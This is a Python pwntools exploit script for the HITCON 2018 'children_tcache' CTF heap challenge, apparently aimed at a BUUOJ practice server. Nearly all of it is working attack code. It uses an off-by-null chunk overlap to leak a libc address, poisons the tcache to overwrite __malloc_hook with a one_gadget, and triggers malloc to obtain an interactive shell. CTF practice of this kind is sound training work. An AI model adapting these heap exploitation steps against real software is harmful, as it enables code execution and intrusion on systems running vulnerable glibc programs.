# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './HITCON_2018_children_tcache'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25062'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def bgdb(fun):
    gdb.attach(p,'b %s'%fun)

def cmd(num):
    sla('choice:',num)

def add(size,content):
    cmd(1)
    sla("Size:",size)
    sa("Data:",content)

def delete(idx):
    cmd(3)
    sla("dex:",idx)

def show(idx):
    cmd(2)
    sla("dex:",idx)

add(0x418,"a") #0
add(0x18,"a") #1
add(0x4f8,"a") #2
add(0x18,"sh\x00") #3

delete(1)
delete(0)

for i in range(8):
    add(0x18 - i, 'b' * (0x18 - i))
    delete(0)


payload = "a"*0x10 + p64(0x420 + 0x20)
add(0x18,payload) #0


delete(2)

add(0x418, 'a'*0x417) #1

show(0)

malloc_hook = l64() - 0x70
lg("malloc_hook",malloc_hook)

libc.address = malloc_hook - libc.sym["__malloc_hook"]
free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]
onegadget = [0x4f2c5,0x4f322,0x10a38c]
gadget = onegadget[1] + libc.address


add(0x18,"a") #2

delete(2)
delete(0)

add(0x18,p64(malloc_hook))
add(0x18,p64(malloc_hook))
add(0x18,p64(gadget))

#add(0x8,"sh\x00")
lg("malloc_hook",malloc_hook)
lg("gadget",gadget)

#delete(4)
cmd(1)
sla("Size:",0x50)

p.interactive()

'''
@File    :   HITCON_2018_children_tcache.py
@Time    :   2021/07/20 17:34:10
@Author  :   Niyah 
'''